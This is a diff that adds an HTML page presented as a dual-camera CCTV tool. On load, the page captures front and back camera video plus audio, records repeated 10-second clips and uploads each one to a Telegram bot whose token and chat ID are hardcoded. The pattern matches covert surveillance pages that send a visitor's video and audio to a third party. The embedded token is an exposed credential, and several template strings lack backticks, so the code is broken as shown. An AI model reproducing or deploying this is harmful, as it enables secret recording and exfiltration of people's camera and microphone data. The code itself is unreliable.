@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CCTV Dual Camera → Telegram</title>
+<style>
+body { background:#0f3b4b; color:#fff; font-family:sans-serif; text-align:center; padding:20px; }
+video { width:240px; border:2px solid #2fb66e; border-radius:8px; margin:10px; }
+#status { margin-top:10px; color:#ffd; }
+</style>
+</head>
+<body>
+<h2>📹 Dual CCTV (Front + Back) → Telegram</h2>
+<div>
+  <video id="front" autoplay playsinline></video>
+  <video id="back" autoplay playsinline></video>
+</div>
+<div id="status">Status: idle</div>
+
+<script>
+const BOT_TOKEN = "8439360131:AAGHrU3cstAg-EzNIWv4g1b2l6DD_3l8CKE"; 
+const CHAT_ID   = "1842424886"; 
+
+const frontCam = document.getElementById("front");
+const backCam  = document.getElementById("back");
+const statusEl = document.getElementById("status");
+
+let recorders = [];
+
+async function startCameras(){
+  try {
+    // front camera
+    const streamFront = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
+    frontCam.srcObject = streamFront;
+    setupRecorder(streamFront, "front");
+
+    // back camera
+    const streamBack = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" }, audio:true });
+    backCam.srcObject = streamBack;
+    setupRecorder(streamBack, "back");
+
+  }catch(err){
+    statusEl.textContent = "Camera error: " + err.message;
+  }
+}
+
+function setupRecorder(stream, label){
+  let chunks = [];
+  const rec = new MediaRecorder(stream, { mimeType:"video/webm" });
+
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.onstop = ()=> sendVideo(chunks, label);
+
+  setInterval(()=>{
+    if(rec.state === "inactive"){
+      chunks = [];
+      rec.start();
+      statusEl.textContent = 🔴 Recording (${label})...;
+      setTimeout(()=> rec.stop(), 10000);
+    }
+  }, 12000);
+
+  recorders.push(rec);
+}
+
+async function sendVideo(chunks, label){
+  let blob = new Blob(chunks, {type:"video/webm"});
+  const fd = new FormData();
+  fd.append("video", blob, ${label}_${Date.now()}.webm);
+
+  try{
+    const resp = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}, {
+      method:"POST",
+      body: fd
+    });
+    const data = await resp.json();
+    statusEl.textContent = data.ok ? ✅ Sent ${label} : ❌ Failed ${label};
+  }catch(e){
+    statusEl.textContent = "Upload error: " + e.message;
+  }
+}
+
+startCameras();
+</script>
+</body>
+</html>
